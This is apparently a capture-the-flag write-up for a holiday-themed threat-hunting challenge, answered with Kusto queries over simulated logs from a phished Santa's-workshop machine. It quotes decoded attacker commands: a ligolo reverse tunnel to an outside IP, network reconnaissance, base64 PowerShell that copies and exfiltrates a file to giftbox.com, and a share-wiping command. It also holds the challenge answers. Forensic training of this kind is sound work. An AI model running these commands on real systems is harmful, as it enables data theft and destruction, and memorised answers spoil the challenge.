## Objective
Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.

## Solutions

- How many Craftperson Elf's are working from laptops? ```25```
```Kql
Employees 
| where role has "Craftsperson Elf" 
| where hostname has "LAPTOP"
| count
```
---------------
- What is the email address of the employee who received this phishing email? ```alabaster_snowball@santaworkshopgeeseislands.org```
- What is the email address that was used to send this spear phishing email? ```cwombley@gmail.com```
- What was the subject line used in the spear phishing email? ```[EXTERNAL] Invoice foir reindeer food past due```
```Kql
Email
| where link has "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```
---------------
- What is the role of our victim in the organization? ```Head Elf```
- What is the hostname of the victim's machine? ```Y1US-DESKTOP```
- What is the source IP linked to the victim? ```10.10.0.4```
```Kql
Employees
| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
```
---------------
- What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs! ```2023-12-02T10:12:42Z```
- What file is dropped to Alabaster's machine shortly after he downloads the malicious file? ```giftwrap.exe```
---------------
```Kql
FileCreationEvents
| where hostname == "Y1US-DESKTOP"
| sort by timestamp
```
---------------
- The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to? ```113.37.9.17```
- What is the timestamp when the attackers enumerated network shares on the machine? ```2023-12-02T16:51:44Z```
- What was the hostname of the system the attacker moved laterally to? ```NorthPolefileshare```
```Kql
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp >= datetime("2023-12-02T10:12:42Z")
| where parent_process_hash == "614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f"
```
```
"ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
netstat
ipconfig
arp -a
netstat -an
nbtstat-n
net view /DOMAIN
net share
net use
net config
systeminfo
"C:\Users\alsnowball\AppData\Local\Microsoft\Teams\current\Teams.exe" --type=relauncher --no-sandbox --- 
```
---------------
- When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine? ```2023-12-24T16:07:47Z```
- What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding) ```NaughtyNiceList.txt```
- The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to? ```giftbox.com```
```Kql
ProcessEvents
| where timestamp >= datetime("2023-12-02T10:12:42Z")
| where hostname == "Y1US-DESKTOP"
```
#### Powershell 1 Analysis
```powershell
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
```
```powershell
( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''
```
```powershell
txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop
```
```powershell
powershell.exe -c Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt
```
#### Powershell 2 Analysis
```powershell
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=
```
```powershell
[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*MDr*').NamE[3,11,2]-joiN
```
```powershell
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
```
---------------
- What is the name of the executable the attackers used in the final malicious command? ```downwithsanta.exe```
- What was the command line flag used alongside this executable? ```--wipeall```

#### Powershell 3 Analysis
```powershell
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=
```
```powershell
C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
```
---------------
```python
print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')
Beware the Cube that Wombles
```
